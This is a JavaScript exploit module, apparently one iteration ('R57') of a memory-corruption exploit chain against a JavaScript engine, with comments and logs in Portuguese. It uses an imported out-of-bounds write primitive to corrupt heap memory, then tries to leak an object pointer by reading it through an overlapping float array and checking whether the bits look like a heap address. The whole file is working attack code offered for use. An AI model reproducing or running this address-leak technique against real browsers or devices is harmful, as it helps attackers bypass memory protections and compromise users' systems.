// js/script3/UltimateExploit.mjs (R57 - Teste Definitivo de Sobreposição de Memória)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
} from '../core_exploit.mjs';

export const FNAME_MODULE_ULTIMATE = "Ultimate_Exploit_R57";

// --- Funções Auxiliares de Conversão ---
const conversion_buffer = new ArrayBuffer(8);
const float_view = new Float64Array(conversion_buffer);
const uint32_view = new Uint32Array(conversion_buffer);

function ftoi(f) {
    float_view[0] = f;
    return new AdvancedInt64(uint32_view[0], uint32_view[1]);
}

// --- Função Principal do Teste ---
export async function executeMemoryOverlapTest_R57() {
    let final_result = { success: false, message: "Teste não conclusivo.", leaked_bits: null };
    logS3("--- Iniciando R57: Teste Definitivo de Sobreposição de Memória ---", "test");

    try {
        await triggerOOB_primitive({ force_reinit: true });

        // 1. Criamos nossos dois arrays, um para floats, outro para objetos.
        let float_array = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
        let object_array = [{}];

        // 2. Acionamos a mesma instabilidade de heap de antes.
        oob_write_absolute(0x70, 0xFFFFFFFF, 4);
        
        // 3. Escrevemos um objeto conhecido no array de objetos.
        // Internamente, o ponteiro para este objeto será escrito na memória do array.
        const target_obj = { marker: 0xAAAAAAAA };
        object_array[0] = target_obj;
        logS3(`[R57] Objeto alvo inserido em 'object_array'.`, 'debug');

        // 4. Lemos do array de floats e convertemos para bits.
        // Se a sobreposição ocorreu, os bits do ponteiro de 'target_obj' devem aparecer aqui.
        const read_float = float_array[4]; // Lendo o índice que falhou anteriormente
        const leaked_bits = ftoi(read_float);
        
        final_result.leaked_bits = leaked_bits.toString(true);
        logS3(`[R57] Valor lido de 'float_array[4]': ${read_float}`, 'info');
        logS3(`[R57] Representação em bits (leaked_bits): ${final_result.leaked_bits}`, 'leak');

        // 5. Analisamos o resultado.
        const original_bits_of_5_5 = new AdvancedInt64("0x4016000000000000");

        if (leaked_bits.equals(original_bits_of_5_5)) {
            final_result.message = "FALHA: Nenhuma sobreposição detectada. O valor lido foi o original '5.5'.";
            final_result.success = false;
        } else if (leaked_bits.high() > 0x1000) { // Um ponteiro de heap válido terá um high part significativo
            final_result.message = "SUCESSO POTENCIAL: Sobreposição detectada! Os bits lidos parecem um ponteiro de memória.";
            final_result.success = true;
        } else {
            final_result.message = "INCONCLUSIVO: Os bits lidos mudaram, mas não parecem um ponteiro de heap válido.";
            final_result.success = false;
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO: ${e.message}`, "critical");
        final_result.message = e.message;
        final_result.success = false;
    }
    return final_result;
}
